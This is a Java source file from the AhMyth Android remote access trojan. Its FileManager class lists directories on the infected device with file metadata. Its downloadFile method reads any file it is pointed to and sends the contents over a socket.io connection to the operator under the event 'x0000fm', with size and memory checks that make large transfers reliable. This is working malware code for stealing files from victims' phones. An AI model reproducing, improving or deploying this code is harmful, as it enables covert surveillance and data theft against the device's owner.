package ahmyth.mine.king.ahmyth;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;


/**
 * Created by AhMyth on 10/23/16.
 */

public class FileManager {


    public static JSONArray walk(String path){


        // Read all files sorted into the values-array
        JSONArray values = new JSONArray();
        File dir = new File(path);
        if (!dir.canRead()) {
            Log.d("cannot","inaccessible");
        }

        File[] list = dir.listFiles();
        try {
        if (list != null) {
            JSONObject parenttObj = new JSONObject();
            parenttObj.put("name", "../");
            parenttObj.put("isDir", true);
            parenttObj.put("path", dir.getParent());
            values.put(parenttObj);
            for (File file : list) {
                if (!file.getName().startsWith(".")) {
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", file.getName());
                        fileObj.put("isDir", file.isDirectory());
                        fileObj.put("path", file.getAbsolutePath());
                        
                        // Enhanced metadata
                        fileObj.put("size", file.length());
                        fileObj.put("lastModified", file.lastModified());
                        fileObj.put("canRead", file.canRead());
                        fileObj.put("canWrite", file.canWrite());
                        fileObj.put("canExecute", file.canExecute());
                        fileObj.put("isHidden", file.isHidden());
                        
                        values.put(fileObj);

                }
            }
        }
        } catch (JSONException e) {
            e.printStackTrace();
        }


        return values;
    }

    public static void downloadFile(String path){
        io.socket.client.Socket socket = IOSocket.getInstance().getIoSocket();
        if (socket == null || !socket.connected()) {
            Log.e("FileManager", "Socket not connected, cannot download file");
            try {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Socket not connected");
                error.put("path", path);
                socket.emit("x0000fm", error);
            } catch (Exception e) {
                Log.e("FileManager", "Error emitting socket error", e);
            }
            return;
        }
        
        // Maximum file size: 50MB to prevent OutOfMemoryError and socket crashes
        final long MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB
        
        try {
            if (path == null || path.isEmpty()) {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Path is null or empty");
                error.put("path", path);
                socket.emit("x0000fm", error);
                return;
            }

            File file = new File(path);

            if (!file.exists()) {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "File does not exist: " + path);
                error.put("path", path);
                socket.emit("x0000fm", error);
                return;
            }
            
            if (!file.canRead()) {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Cannot read file (permission denied): " + path);
                error.put("path", path);
                socket.emit("x0000fm", error);
                return;
            }

            long fileSize = file.length();
            if (fileSize <= 0) {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "File is empty: " + path);
                error.put("path", path);
                socket.emit("x0000fm", error);
                return;
            }
            
            // Check file size limit
            if (fileSize > MAX_FILE_SIZE) {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "File too large: " + (fileSize / 1024 / 1024) + "MB (max: " + (MAX_FILE_SIZE / 1024 / 1024) + "MB)");
                error.put("path", path);
                error.put("size", fileSize);
                socket.emit("x0000fm", error);
                Log.w("FileManager", "File too large to download: " + file.getName() + " (" + (fileSize / 1024 / 1024) + "MB)");
                return;
            }
            
            // Check available memory before allocating
            Runtime runtime = Runtime.getRuntime();
            long freeMemory = runtime.freeMemory();
            long maxMemory = runtime.maxMemory();
            long availableMemory = maxMemory - (runtime.totalMemory() - freeMemory);
            
            // Need at least 2x file size in available memory (for buffer + JSON encoding overhead)
            if (availableMemory < fileSize * 2) {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Insufficient memory to read file. Available: " + (availableMemory / 1024 / 1024) + "MB, Required: " + (fileSize * 2 / 1024 / 1024) + "MB");
                error.put("path", path);
                error.put("size", fileSize);
                socket.emit("x0000fm", error);
                Log.w("FileManager", "Insufficient memory to download file: " + file.getName());
                return;
            }
            
            int size = (int) fileSize; // Safe cast since we checked MAX_FILE_SIZE
            byte[] data = null;
            BufferedInputStream buf = null;
            
            try {
                // Allocate buffer
                data = new byte[size];
                buf = new BufferedInputStream(new FileInputStream(file));
                
                // Read file in chunks to avoid blocking
                int totalBytesRead = 0;
                int bytesRead;
                int chunkSize = Math.min(8192, size); // Read in 8KB chunks
                
                while (totalBytesRead < size && (bytesRead = buf.read(data, totalBytesRead, Math.min(chunkSize, size - totalBytesRead))) != -1) {
                    totalBytesRead += bytesRead;
                }
                
                buf.close();
                buf = null;
                
                if (totalBytesRead != size) {
                    JSONObject error = new JSONObject();
                    error.put("file", false);
                    error.put("error", "Failed to read complete file. Read " + totalBytesRead + " of " + size + " bytes");
                    error.put("path", path);
                    socket.emit("x0000fm", error);
                    return;
                }
                
                // Create response object
                JSONObject object = new JSONObject();
                object.put("file", true);
                object.put("name", file.getName());
                object.put("buffer", data);
                object.put("size", size);
                object.put("path", path);
                
                // Emit synchronously - the socket library handles async internally
                socket.emit("x0000fm", object);
                Log.d("FileManager", "File downloaded successfully: " + file.getName() + " (" + size + " bytes)");
                
            } catch (OutOfMemoryError e) {
                Log.e("FileManager", "Out of memory reading file: " + path, e);
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Out of memory: File too large (" + (fileSize / 1024 / 1024) + "MB)");
                error.put("path", path);
                error.put("size", fileSize);
                socket.emit("x0000fm", error);
            } catch (FileNotFoundException e) {
                Log.e("FileManager", "File not found: " + path, e);
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "File not found: " + e.getMessage());
                error.put("path", path);
                socket.emit("x0000fm", error);
            } catch (IOException e) {
                Log.e("FileManager", "IO error reading file: " + path, e);
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "IO error: " + e.getMessage());
                error.put("path", path);
                socket.emit("x0000fm", error);
            } catch (JSONException e) {
                Log.e("FileManager", "JSON error: " + path, e);
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "JSON error: " + e.getMessage());
                error.put("path", path);
                socket.emit("x0000fm", error);
            } finally {
                // Clean up resources
                if (buf != null) {
                    try {
                        buf.close();
                    } catch (IOException e) {
                        Log.e("FileManager", "Error closing stream", e);
                    }
                }
            }
        } catch (JSONException e) {
            Log.e("FileManager", "Error creating error response", e);
            try {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Unexpected error: " + e.getMessage());
                error.put("path", path);
                socket.emit("x0000fm", error);
            } catch (Exception ex) {
                Log.e("FileManager", "Error emitting final error response", ex);
            }
        } catch (Exception e) {
            Log.e("FileManager", "Unexpected error in downloadFile", e);
            try {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Unexpected error: " + e.getMessage());
                error.put("path", path);
                socket.emit("x0000fm", error);
            } catch (Exception ex) {
                Log.e("FileManager", "Error emitting unexpected error response", ex);
            }
        }
    }

}
